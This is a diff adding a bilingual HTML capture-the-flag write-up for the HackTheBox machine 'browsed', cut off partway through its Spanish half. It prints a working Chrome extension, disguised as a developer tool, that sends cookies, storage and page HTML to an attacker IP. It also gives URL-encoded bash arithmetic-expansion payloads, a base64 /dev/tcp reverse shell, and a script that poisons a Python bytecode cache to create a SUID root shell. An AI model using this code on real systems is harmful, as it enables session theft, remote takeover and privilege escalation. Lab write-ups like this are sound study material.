@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>browsed | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+    <style>
+        pre {
+            position: relative;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-x: hidden;
+        }
+        pre::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 6px;
+            left: 12px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            opacity: 0.5;
+            font-family: 'Inter', sans-serif;
+        }
+        pre code {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+        /* Syntax highlighting - light mode */
+        [data-theme="light"] .kw { color: #d73a49; }
+        [data-theme="light"] .str { color: #032f62; }
+        [data-theme="light"] .func { color: #6f42c1; }
+        [data-theme="light"] .cm { color: #6a737d; font-style: italic; }
+        [data-theme="light"] .num { color: #005cc5; }
+        [data-theme="light"] .op { color: #d73a49; }
+        [data-theme="light"] .var { color: #e36209; }
+        [data-theme="light"] .cmd { color: #22863a; }
+        [data-theme="light"] .flag { color: #005cc5; }
+        [data-theme="light"] .url { color: #032f62; }
+        [data-theme="light"] .param { color: #6f42c1; }
+        /* Syntax highlighting - dark mode */
+        [data-theme="dark"] .kw { color: #ff7b72; }
+        [data-theme="dark"] .str { color: #a5d6ff; }
+        [data-theme="dark"] .func { color: #d2a8ff; }
+        [data-theme="dark"] .cm { color: #8b949e; font-style: italic; }
+        [data-theme="dark"] .num { color: #79c0ff; }
+        [data-theme="dark"] .op { color: #ff7b72; }
+        [data-theme="dark"] .var { color: #ffa657; }
+        [data-theme="dark"] .cmd { color: #7ee787; }
+        [data-theme="dark"] .flag { color: #79c0ff; }
+        [data-theme="dark"] .url { color: #a5d6ff; }
+        [data-theme="dark"] .param { color: #d2a8ff; }
+    </style>
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">browsed</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <!-- ==================== ENGLISH CONTENT ==================== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running an <code>nginx</code> web server hosting a page that accepted Chrome extension uploads in <code>.zip</code> format. The idea was that a bot would install and run the uploaded extension, which opened the door to a creative attack chain. I crafted a malicious Chrome extension with broad permissions (<code>&lt;all_urls&gt;</code>, <code>cookies</code>, <code>tabs</code>) that exfiltrated cookies and page content from all websites the bot visited, sending the data back to my attacker machine.</p>
+
+                    <p>Through the exfiltrated cookies and HTML content, I discovered a hidden internal subdomain <code>browsedinternals.htb</code> running a Gitea instance (version 1.24.5). Inside Gitea, I found a repository containing a Flask application (<code>app.py</code>) and a bash script (<code>routines.sh</code>) running locally on port 5000. The bash script contained a dangerous <code>[[ "$1" -eq 0 ]]</code> comparison, which is vulnerable to arithmetic expansion RCE. By crafting a second malicious extension that made the bot's browser request a specially crafted URL on <code>127.0.0.1:5000</code> containing a URL-encoded payload like <code>x[$(command)]</code>, I achieved remote code execution as the <code>larry</code> user and obtained a reverse shell.</p>
+
+                    <p>For privilege escalation, the user <code>larry</code> could run <code>/opt/extensiontool/extension_tool.py</code> as root via <code>sudo</code> without a password. This Python script imported <code>extension_utils</code>, and the <code>__pycache__</code> directory had world-writable permissions (similar to <code>/tmp</code>). I exploited this by crafting a malicious <code>.pyc</code> bytecode file with matching file size and timestamp to the original <code>extension_utils.py</code>, placing it in the <code>__pycache__</code> directory. When the sudo command was executed, Python loaded the poisoned cache file, which created a SUID copy of <code>/bin/bash</code>, granting root access.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> Chrome extension data exfiltration, bash arithmetic expansion RCE, Python <code>__pycache__</code> bytecode cache poisoning via world-writable directory permissions.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an <code>nmap</code> scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image1.png" alt="Nmap scan results showing open ports on the target machine" /></p>
+
+                <p>Running <code>whatweb</code> provides additional information about the web server:</p>
+                <pre data-lang="plaintext"><code>http://10.129.1.175 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.1.175], JQuery, Script, Title[Browsed], nginx[1.24.0]</code></pre>
+
+                <p>The web server is running <code>nginx 1.24.0</code> on Ubuntu. I notice the domain <code>browsed.htb</code> in the page header, so I add it to my <code>/etc/hosts</code> file.</p>
+
+                <h2>Web Enumeration - Extension Upload</h2>
+                <p>Navigating to <a href="http://browsed.htb/upload.php">http://browsed.htb/upload.php</a>, I find an interesting upload page:</p>
+                <p><img src="./media/image2.png" alt="Upload page at browsed.htb/upload.php showing a Chrome extension upload form" /></p>
+
+                <p>This looks like a promising attack vector — the page accepts Chrome extension uploads. Based on my reconnaissance so far, this appears to be the primary entry point. The implication is that a bot on the server will install and test uploaded extensions, which means I can craft a malicious extension to exfiltrate data from whatever websites the bot visits.</p>
+
+                <h2>Malicious Chrome Extension - Data Exfiltration</h2>
+                <p>Since I know the bot will install and run the extension, I create one that requests very broad permissions. This will allow me to see all the data from websites the bot has visited along with their cookies. The extension consists of three files:</p>
+
+                <h3>manifest.json</h3>
+                <p>The manifest requests extensive permissions including <code>cookies</code>, <code>tabs</code>, <code>storage</code>, and most importantly <code>&lt;all_urls&gt;</code>, which grants access to all websites the bot visits:</p>
+                <pre data-lang="json"><code>{
+  <span class="str">"manifest_version"</span>: <span class="num">3</span>,
+  <span class="str">"name"</span>: <span class="str">"Helpful Developer Tool"</span>,
+  <span class="str">"version"</span>: <span class="str">"1.0"</span>,
+  <span class="str">"description"</span>: <span class="str">"A useful tool for developers"</span>,
+  <span class="str">"permissions"</span>: [
+    <span class="str">"activeTab"</span>,
+    <span class="str">"cookies"</span>,
+    <span class="str">"storage"</span>,
+    <span class="str">"tabs"</span>,
+    <span class="str">"&lt;all_urls&gt;"</span>
+  ],
+  <span class="str">"host_permissions"</span>: [
+    <span class="str">"&lt;all_urls&gt;"</span>
+  ],
+  <span class="str">"background"</span>: {
+    <span class="str">"service_worker"</span>: <span class="str">"background.js"</span>
+  },
+  <span class="str">"content_scripts"</span>: [
+    {
+      <span class="str">"matches"</span>: [<span class="str">"&lt;all_urls&gt;"</span>],
+      <span class="str">"js"</span>: [<span class="str">"content.js"</span>],
+      <span class="str">"run_at"</span>: <span class="str">"document_end"</span>
+    }
+  ]
+}</code></pre>
+
+                <h3>content.js</h3>
+                <p>The content script runs on every page the bot visits. It captures the current URL, cookies, and the first 5000 characters of the page HTML, base64-encodes it all, and sends it to my attacker machine. It also has a form submission listener, but in practice only the initial page data exfiltration fires since the HTB bot doesn't submit any forms:</p>
+                <pre data-lang="javascript"><code>(<span class="kw">function</span>() {
+  document.<span class="func">addEventListener</span>(<span class="str">'submit'</span>, <span class="kw">function</span>(e) {
+    <span class="kw">const</span> formData = <span class="kw">new</span> <span class="func">FormData</span>(e.target);
+    <span class="kw">const</span> data = Object.<span class="func">fromEntries</span>(formData);
+    <span class="kw">const</span> payload = <span class="func">btoa</span>(JSON.<span class="func">stringify</span>({
+      url: window.location.href,
+      formData: data
+    }));
+    <span class="func">fetch</span>(<span class="str">`http://10.10.14.172:8000/?type=form&amp;data=</span><span class="var">${payload}</span><span class="str">`</span>)
+      .<span class="func">catch</span>(e => console.<span class="func">error</span>(e));
+  });
+
+  <span class="kw">const</span> pageData = <span class="func">btoa</span>(JSON.<span class="func">stringify</span>({
+    url: window.location.href,
+    cookies: document.cookie,
+    html: document.body.innerHTML.<span class="func">substring</span>(<span class="num">0</span>, <span class="num">5000</span>)
+  }));
+  <span class="func">fetch</span>(<span class="str">`http://10.10.14.172:8000/?type=initial&amp;data=</span><span class="var">${pageData}</span><span class="str">`</span>)
+    .<span class="func">catch</span>(e => console.<span class="func">error</span>(e));
+})();</code></pre>
+
+                <h3>background.js</h3>
+                <p>The background service worker fires on extension installation and exfiltrates all cookies from the browser. It also has a <code>tabs.onUpdated</code> listener, but this won't trigger in this particular scenario since the HTB bot doesn't update tabs in a way that fires the event:</p>
+                <pre data-lang="javascript"><code>chrome.runtime.<span class="func">onInstalled</span>.<span class="func">addListener</span>(() => {
+  console.<span class="func">log</span>(<span class="str">'Extension installed'</span>);
+
+  chrome.cookies.<span class="func">getAll</span>({}, (cookies) => {
+    <span class="kw">const</span> cookieData = <span class="func">btoa</span>(JSON.<span class="func">stringify</span>(cookies));
+    <span class="func">fetch</span>(<span class="str">`http://10.10.14.172:8000/?type=cookies&amp;data=</span><span class="var">${cookieData}</span><span class="str">`</span>)
+      .<span class="func">catch</span>(e => console.<span class="func">error</span>(e));
+  });
+});
+
+chrome.tabs.<span class="func">onUpdated</span>.<span class="func">addListener</span>((tabId, changeInfo, tab) => {
+  <span class="kw">if</span> (changeInfo.status === <span class="str">'complete'</span> && tab.url) {
+    chrome.scripting.<span class="func">executeScript</span>({
+      target: { tabId: tabId },
+      function: exfiltrateData
+    });
+  }
+});
+
+<span class="kw">function</span> <span class="func">exfiltrateData</span>() {
+  <span class="kw">const</span> data = {
+    url: window.location.href,
+    cookies: document.cookie,
+    localStorage: JSON.<span class="func">stringify</span>(localStorage),
+    sessionStorage: JSON.<span class="func">stringify</span>(sessionStorage),
+    html: document.documentElement.outerHTML.<span class="func">substring</span>(<span class="num">0</span>, <span class="num">5000</span>)
+  };
+  <span class="kw">const</span> encodedData = <span class="func">btoa</span>(JSON.<span class="func">stringify</span>(data));
+  <span class="func">fetch</span>(<span class="str">`http://10.10.14.172:8000/?type=pagedata&amp;data=</span><span class="var">${encodedData}</span><span class="str">`</span>)
+    .<span class="func">catch</span>(e => console.<span class="func">error</span>(e));
+}</code></pre>
+
+                <h2>Discovering the Internal Gitea Instance</h2>
+                <p>I compress the extension into a <code>.zip</code> file, start a Python HTTP server on port 8000 to capture exfiltrated data, and upload the extension. Shortly after, I receive callbacks with page contents and cookies. The exfiltrated cookie data reveals a previously unknown domain and a Gitea instance (version 1.24.5):</p>
+                <pre data-lang="json"><code>[
+  {
+    <span class="str">"domain"</span>: <span class="str">"browsedinternals.htb"</span>,
+    <span class="str">"hostOnly"</span>: <span class="kw">true</span>,
+    <span class="str">"httpOnly"</span>: <span class="kw">true</span>,
+    <span class="str">"name"</span>: <span class="str">"i_like_gitea"</span>,
+    <span class="str">"path"</span>: <span class="str">"/"</span>,
+    <span class="str">"sameSite"</span>: <span class="str">"lax"</span>,
+    <span class="str">"secure"</span>: <span class="kw">false</span>,
+    <span class="str">"session"</span>: <span class="kw">true</span>,
+    <span class="str">"storeId"</span>: <span class="str">"0"</span>,
+    <span class="str">"value"</span>: <span class="str">"676e92f7569d276e"</span>
+  },
+  {
+    <span class="str">"domain"</span>: <span class="str">"browsedinternals.htb"</span>,
+    <span class="str">"expirationDate"</span>: <span class="num">1768645920.977966</span>,
+    <span class="str">"hostOnly"</span>: <span class="kw">true</span>,
+    <span class="str">"httpOnly"</span>: <span class="kw">true</span>,
+    <span class="str">"name"</span>: <span class="str">"_csrf"</span>,
+    <span class="str">"path"</span>: <span class="str">"/"</span>,
+    <span class="str">"sameSite"</span>: <span class="str">"lax"</span>,
+    <span class="str">"secure"</span>: <span class="kw">false</span>,
+    <span class="str">"session"</span>: <span class="kw">false</span>,
+    <span class="str">"storeId"</span>: <span class="str">"0"</span>,
+    <span class="str">"value"</span>: <span class="str">"r6E_bV0oE45umR9BfQxG95TuANE6MTc2ODU1OTUyMDk2ODcyOTM3MQ"</span>
+  }
+]</code></pre>
+
+                <p>I add <code>browsedinternals.htb</code> to my <code>/etc/hosts</code> file and visit the Gitea instance. There I find a repository called <code>larry/MarkdownPreview</code> containing a Flask web application (<code>app.py</code>), a bash script (<code>routines.sh</code>), and some log/backup HTML files that don't appear useful.</p>
+
+                <p>The <code>markdown.md</code> file in the repository contains this note:</p>
+                <blockquote>
+                    <p># markdownPreview<br>This webapp allows us to convert our md files to html. Still in developement, it should only run locally !!!</p>
+                </blockquote>
+
+                <p>This is key information — the application is running locally on port 5000. The idea becomes clear: since the Chrome extension runs in the bot's browser context (which has access to <code>127.0.0.1</code>), I can use the extension to make requests to this local-only Flask application.</p>
+
+                <h2>Code Analysis - Arithmetic Expansion RCE</h2>
+                <p>Reviewing the repository code, I find a critical vulnerability. In <code>routines.sh</code>, there are comparisons like this:</p>
+                <pre data-lang="bash"><code><span class="kw">if</span> [[ <span class="str">"$1"</span> <span class="flag">-eq</span> <span class="num">0</span> ]]; <span class="kw">then</span></code></pre>
+
+                <p>This type of comparison using <code>-eq</code> inside <code>[[ ]]</code> is dangerous because it's vulnerable to code execution through <strong>arithmetic expansion</strong>. If I can control the first argument and send it as <code>x[$(id)]</code>, the variable expansion will execute the <code>id</code> command.</p>
+
+                <p>In <code>app.py</code>, I find the route that calls this script:</p>
+                <pre data-lang="python"><code><span class="op">@</span>app.<span class="func">route</span>(<span class="str">'/routines/&lt;rid&gt;'</span>)
+<span class="kw">def</span> <span class="func">routines</span>(rid):
+    <span class="cm"># Call the script that manages the routines</span>
+    <span class="cm"># Run bash script with the input as an argument (NO shell)</span>
+    subprocess.<span class="func">run</span>([<span class="str">"./routines.sh"</span>, rid])
+    <span class="kw">return</span> <span class="str">"Routine executed !"</span></code></pre>
+
+                <p>I can control the first argument via the <code>&lt;rid&gt;</code> parameter in the URL. Even though <code>subprocess.run</code> is used without <code>shell=True</code>, the bash script itself will perform the arithmetic expansion when evaluating the <code>-eq</code> comparison.</p>
+
+                <h2>Initial Access - RCE via Arithmetic Expansion</h2>
+                <h3>Proof of Concept</h3>
+                <p>To prove the RCE, I create a new extension with this <code>content.js</code> that makes the bot's browser request the vulnerable Flask endpoint with a URL-encoded payload:</p>
+                <pre data-lang="javascript"><code>(<span class="kw">function</span>() {
+  <span class="func">fetch</span>(<span class="str">`http://127.0.0.1:5000/routines/x%5B%24(curl%2010.10.14.172)%5D`</span>)
+    .<span class="func">catch</span>(e => <span class="func">fetch</span>(<span class="str">`http://10.10.14.172:8000?data=</span><span class="var">${e}</span><span class="str">`</span>));
+})();</code></pre>
+
+                <p>I removed the form submit event listener since it won't be used anyway. The key part of this code is the URL-encoded payload after <code>/routines/</code>:</p>
+                <pre data-lang="plaintext"><code>x%5B%24(curl%2010.10.14.172)%5D</code></pre>
+
+                <p>URL-decoded, this becomes <code>x[$(curl 10.10.14.172)]</code> — a simple callback to my IP to confirm RCE. I start listeners on ports 80 and 8000, upload the extension, and receive the HTTP request on port 80, confirming command execution on the target:</p>
+                <pre data-lang="plaintext"><code>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.1.175 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <h3>Reverse Shell</h3>
+                <p>Now that RCE is confirmed, I prepare a reverse shell. To avoid URL-encoding issues, I base64-encode the reverse shell payload:</p>
+                <pre data-lang="bash"><code><span class="cmd">echo</span> <span class="str">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.172/443 0&gt;&amp;1"'</span> | <span class="cmd">base64</span></code></pre>
+                <pre data-lang="plaintext"><code>YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzIvNDQzIDA+JjEiCg==</code></pre>
+
+                <p>The command the target needs to execute is:</p>
+                <pre data-lang="bash"><code><span class="cmd">echo</span> <span class="str">"YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzIvNDQzIDA+JjEiCg=="</span> | <span class="cmd">base64</span> <span class="flag">-d</span> | <span class="cmd">bash</span></code></pre>
+
+                <p>I craft the final <code>content.js</code> payload with the full URL-encoded reverse shell command:</p>
+                <pre data-lang="javascript"><code>(<span class="kw">function</span>() {
+  <span class="func">fetch</span>(<span class="str">`http://127.0.0.1:5000/routines/x%5B%24(echo%20%22YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNzIvNDQzIDA%2BJjEiCg%3D%3D%22%20%7C%20base64%20-d%20%7C%20bash)%5D`</span>)
+    .<span class="func">catch</span>(e => <span class="func">fetch</span>(<span class="str">`http://10.10.14.172:8000?data=</span><span class="var">${e}</span><span class="str">`</span>));
+})();</code></pre>
+
+                <p>After uploading the extension, I receive a reverse shell as the <code>larry</code> user.</p>
+
+                <h2>Privilege Escalation - __pycache__ .pyc Cache Poisoning</h2>
+                <p>Checking sudo privileges for <code>larry</code>:</p>
+                <pre data-lang="bash"><code>larry@browsed:~/markdownPreview$ <span class="cmd">sudo</span> <span class="flag">-l</span></code></pre>
+                <pre data-lang="plaintext"><code>Matching Defaults entries for larry on browsed:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User larry may run the following commands on browsed:
+    (root) NOPASSWD: /opt/extensiontool/extension_tool.py</code></pre>
+
+                <p>The user can run <code>/opt/extensiontool/extension_tool.py</code> as root without a password. After reviewing the code of <code>extension_tool.py</code> and its dependency <code>extension_utils.py</code>, I don't find anything directly exploitable in the code itself.</p>
+
+                <p>However, something catches my eye: the <code>__pycache__</code> directory has world-writable permissions (similar to <code>/tmp</code>), meaning anyone can create or modify files inside it. When the script is run with sudo, it creates this compiled bytecode file inside the cache directory:</p>
+                <pre data-lang="plaintext"><code>extension_utils.cpython-312.pyc</code></pre>
+
+                <h3>Understanding __pycache__ Poisoning</h3>
+                <p>When Python imports a module, it compiles it to bytecode (<code>.pyc</code> files) stored in <code>__pycache__/</code>. If this directory is world-writable, you can replace these compiled files with malicious bytecode that executes when the module is imported.</p>
+
+                <p>However, it's not as simple as just dropping a file — Python stores certain metadata about the cached file that must match for the cache to be used. Specifically, the malicious <code>.pyc</code> file must have exactly the <strong>same file size</strong> and the <strong>same timestamp</strong> as the original <code>.py</code> source file.</p>
+
+                <h3>Crafting the Exploit</h3>
+                <p>Taking all of this into account, I create a Python script that copies the original <code>extension_utils.py</code> but injects a command to create a SUID copy of <code>/bin/bash</code>. To maintain the exact same file size, it shortens a docstring comment to compensate for the added payload. It also matches the timestamp of the original file, then compiles it and places the resulting <code>.pyc</code> in the vulnerable <code>__pycache__</code> directory:</p>
+                <pre data-lang="python"><code><span class="kw">import</span> os
+<span class="kw">import</span> py_compile
+
+<span class="var">ORIGINAL_PY</span> = <span class="str">'/opt/extensiontool/extension_utils.py'</span>
+<span class="var">TEMP_PY</span> = <span class="str">'/tmp/extension_utils.py'</span>
+<span class="var">TARGET_PYC</span> = <span class="str">'/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc'</span>
+
+orig_stat = os.<span class="func">stat</span>(<span class="var">ORIGINAL_PY</span>)
+orig_size = orig_stat.st_size
+orig_mtime = orig_stat.st_mtime
+
+<span class="kw">with</span> <span class="func">open</span>(<span class="var">ORIGINAL_PY</span>, <span class="str">'r'</span>) <span class="kw">as</span> f:
+    original = f.<span class="func">read</span>()
+
+<span class="cm"># Replace the long docstring with a shorter one</span>
+modified = original.<span class="func">replace</span>(
+    <span class="str">'""" Clean up temporary files or unnecessary directories after packaging """'</span>,
+    <span class="str">'""" Clean """'</span>
+)
+
+<span class="cm"># Add our payload after imports</span>
+payload = <span class="str">"os.system('cp /bin/bash /tmp/rootbash &amp;&amp; chmod u+s /tmp/rootbash')\n"</span>
+lines = modified.<span class="func">split</span>(<span class="str">'\n'</span>)
+<span class="kw">for</span> i, line <span class="kw">in</span> <span class="func">enumerate</span>(lines):
+    <span class="kw">if</span> line.<span class="func">strip</span>().<span class="func">startswith</span>(<span class="str">'from jsonschema'</span>):
+        lines.<span class="func">insert</span>(i + <span class="num">1</span>, payload.<span class="func">rstrip</span>())
+        <span class="kw">break</span>
+modified = <span class="str">'\n'</span>.<span class="func">join</span>(lines)
+
+<span class="cm"># Adjust to exact size</span>
+current = <span class="func">len</span>(modified.<span class="func">encode</span>(<span class="str">'utf-8'</span>))
+<span class="kw">if</span> current > orig_size:
+    modified = modified[:-(current - orig_size)]
+<span class="kw">elif</span> current < orig_size:
+    modified += <span class="str">' '</span> * (orig_size - current)
+
+<span class="kw">with</span> <span class="func">open</span>(<span class="var">TEMP_PY</span>, <span class="str">'w'</span>) <span class="kw">as</span> f:
+    f.<span class="func">write</span>(modified)
+
+os.<span class="func">utime</span>(<span class="var">TEMP_PY</span>, (orig_mtime, orig_mtime))
+
+<span class="cm"># Verify</span>
+<span class="kw">if</span> os.<span class="func">stat</span>(<span class="var">TEMP_PY</span>).st_size == orig_size:
+    <span class="func">print</span>(<span class="str">f"[+] Size matched: {orig_size} bytes"</span>)
+    py_compile.<span class="func">compile</span>(<span class="var">TEMP_PY</span>, cfile=<span class="var">TARGET_PYC</span>, doraise=<span class="kw">True</span>)
+    <span class="func">print</span>(<span class="str">"[+] Exploit ready!"</span>)
+<span class="kw">else</span>:
+    <span class="func">print</span>(<span class="str">f"[!] Size mismatch: {os.<span class="func">stat</span>(<span class="var">TEMP_PY</span>).st_size} vs {orig_size}"</span>)</code></pre>
+
+                <h3>Executing the Privilege Escalation</h3>
+                <p>I run the exploit script:</p>
+                <pre data-lang="bash"><code>larry@browsed:/tmp$ <span class="cmd">python3</span> xd.py
+<span class="str">[+] Size matched: 1245 bytes</span>
+<span class="str">[+] Exploit ready!</span></code></pre>
+
+                <p>Now I run the sudo command, which triggers the import of the poisoned <code>extension_utils</code> module. The SUID bash copy is created:</p>
+                <pre data-lang="plaintext"><code>-rwsr-xr-x 1 root root 1.4M rootbash</code></pre>
+
+                <p>Finally, I execute the SUID bash to obtain a root shell:</p>
+                <pre data-lang="bash"><code>larry@browsed:/tmp$ ./<span class="cmd">rootbash</span> <span class="flag">-p</span>
+rootbash-5.2#</code></pre>
+
+                <p>Root access achieved. Machine completed.</p>
+            </div>
+
+            <!-- ==================== SPANISH CONTENT ==================== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> La máquina objetivo ejecutaba un servidor web <code>nginx</code> que alojaba una página que aceptaba subidas de extensiones de Chrome en formato <code>.zip</code>. La idea era que un bot instalaba y ejecutaba la extensión subida, lo que abría la puerta a una cadena de ataque creativa. Creé una extensión de Chrome maliciosa con permisos amplios (<code>&lt;all_urls&gt;</code>, <code>cookies</code>, <code>tabs</code>) que exfiltraba cookies y contenido de páginas de todos los sitios web que el bot visitaba, enviando los datos de vuelta a mi máquina atacante.</p>
+
+                    <p>A través de las cookies y el contenido HTML exfiltrado, descubrí un subdominio interno oculto <code>browsedinternals.htb</code> ejecutando una instancia de Gitea (versión 1.24.5). Dentro de Gitea encontré un repositorio con una aplicación Flask (<code>app.py</code>) y un script bash (<code>routines.sh</code>) que corría localmente en el puerto 5000. El script bash contenía una comparación peligrosa con <code>[[ "$1" -eq 0 ]]</code>, vulnerable a RCE mediante expansión aritmética. Creando una segunda extensión maliciosa que hacía que el navegador del bot solicitase una URL especialmente construida en <code>127.0.0.1:5000</code> con un payload codificado en URL como <code>x[$(comando)]</code>, conseguí ejecución remota de código como el usuario <code>larry</code> y obtuve una reverse shell.</p>
+
+                    <p>Para la escalada de privilegios, el usuario <code>larry</code> podía ejecutar <code>/opt/extensiontool/extension_tool.py</code> como root mediante <code>sudo</code> sin contraseña. Este script Python importaba <code>extension_utils</code>, y el directorio <code>__pycache__</code> tenía permisos de escritura global (similar a <code>/tmp</code>). Exploté esto creando un archivo <code>.pyc</code> de bytecode malicioso con el mismo tamaño de archivo y timestamp que el <code>extension_utils.py</code> original, colocándolo en el directorio <code>__pycache__</code>. Al ejecutar el comando sudo, Python cargaba el archivo de caché envenenado, que creaba una copia SUID de <code>/bin/bash</code>, otorgándome acceso root.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Exfiltración de datos mediante extensión de Chrome, RCE por expansión aritmética en bash, envenenamiento de caché de bytecode Python <code>__pycache__</code> mediante directorio con permisos de escritura global.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de <code>nmap</code> para identificar puertos abiertos y servicios en la máquina objetivo:</p>
+                <p><img src="./media/image1.png" alt="Resultados del escaneo nmap mostrando los puertos abiertos en la máquina objetivo" /></p>
+
+                <p>Ejecutando <code>whatweb</code> obtengo información adicional sobre el servidor web:</p>
+                <pre data-lang="plaintext"><code>http://10.129.1.175 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.1.175], JQuery, Script, Title[Browsed], nginx[1.24.0]</code></pre>
+
+                <p>El servidor web ejecuta <code>nginx 1.24.0</code> sobre Ubuntu. Observo el dominio <code>browsed.htb</code> en la cabecera de la página, así que lo añado al fichero <code>/etc/hosts</code>.</p>
+
+                <h2>Enumeración Web - Subida de Extensiones</h2>
+                <p>Navegando a <a href="http://browsed.htb/upload.php">http://browsed.htb/upload.php</a>, encuentro una página de subida interesante:</p>
+                <p><img src="./media/image2.png" alt="Página de subida en browsed.htb/upload.php mostrando un formulario para subir extensiones de Chrome" /></p>
+
+                <p>Parece una buena vía potencial de ataque — la página acepta subidas de extensiones de Chrome. Por el reconocimiento que he hecho, no veo otra vía de momento. La implicación es que un bot en el servidor instalará y probará las extensiones subidas, lo que significa que puedo crear una extensión maliciosa para exfiltrar datos de las webs que el bot visite.</p>
+
+                <h2>Extensión de Chrome Maliciosa - Exfiltración de Datos</h2>
+                <p>Como sé que el bot instalará y ejecutará la extensión, creo una que pida permisos muy amplios. Esto me permitirá ver todos los datos de las webs que haya visitado junto con sus cookies. La extensión consta de tres archivos:</p>
+
+                <h3>manifest.json</h3>
+                <p>El manifiesto solicita permisos extensos incluyendo <code>cookies</code>, <code>tabs</code>, <code>storage</code>, y lo más importante <code>&lt;all_urls&gt;</code>, que concede acceso a todas las webs que visite el bot:</p>
+                <pre data-lang="json"><code>{
+  <span class="str">"manifest_version"</span>: <span class="num">3</span>,
+  <span class="str">"name"</span>: <span class="str">"Helpful Developer Tool"</span>,
+  <span class="str">"version"</span>: <span class="str">"1.0"</span>,
+  <span class="str">"description"</span>: <span class="str">"A useful tool for developers"</span>,
+  <span class="str">"permissions"</span>: [
+    <span class="str">"activeTab"</span>,
+    <span class="str">"cookies"</span>,
+    <span class="str">"storage"</span>,
+    <span class="str">"tabs"</span>,
+    <span class="str">"&lt;all_urls&gt;"</span>
+  ],
+  <span class="str">"host_permissions"</span>: [
+    <span class="str">"&lt;all_urls&gt;"</span>
+  ],
+  <span class="str">"background"</span>: {
+    <span class="str">"service_worker"</span>: <span class="str">"background.js"</span>
+  },
+  <span class="str">"content_scripts"</span>: [
+    {
+      <span class="str">"matches"</span>: [<span class="str">"&lt;all_urls&gt;"</span>],
+      <span class="str">"js"</span>: [<span class="str">"content.js"</span>],
+      <span class="str">"run_at"</span>: <span class="str">"document_end"</span>
+    }
+  ]
+}</code></pre>
+
+                <h3>content.js</h3>
+                <p>El content script se ejecuta en cada página que el bot visita. Captura la URL actual, las cookies y los primeros 5000 caracteres del HTML de la página, lo codifica todo en base64 y lo envía a mi máquina atacante. También tiene un listener de envío de formularios, pero en la práctica solo se dispara la exfiltración inicial de datos de la página, ya que el bot de HTB no hace submit de forms:</p>
+                <pre data-lang="javascript"><code>(<span class="kw">function</span>() {
+  document.<span class="func">addEventListener</span>(<span class="str">'submit'</span>, <span class="kw">function</span>(e) {
+    <span class="kw">const</span> formData = <span class="kw">new</span> <span class="func">FormData</span>(e.target);
+    <span class="kw">const</span> data = Object.<span class="func">fromEntries</span>(formData);
+    <span class="kw">const</span> payload = <span class="func">btoa</span>(JSON.<span class="func">stringify</span>({
+      url: window.location.href,
+      formData: data
+    }));
+    <span class="func">fetch</span>(<span class="str">`http://10.10.14.172:8000/?type=form&amp;data=</span><span class="var">${payload}</span><span class="str">`</span>)
+      .<span class="func">catch</span>(e => console.<span class="func">error</span>(e));
+  });
+
+  <span class="kw">const</span> pageData = <span class="func">btoa</span>(JSON.<span class="func">stringify</span>({
+    url: window.location.href,
+    cookies: document.cookie,
+    html: document.body.innerHTML.<span class="func">substring</span>(<span class="num">0</span>, <span class="num">5000</span>)
+  }));
+  <span class="func">fetch</span>(<span class="str">`http://10.10.14.172:8000/?type=initial&amp;data=</span><span class="var">${pageData}</span><span class="str">`</span>)
+    .<span class="func">catch</span>(e => console.<span class="func">error</span>(e));
+})();</code></pre>
+
+                <h3>background.js</h3>
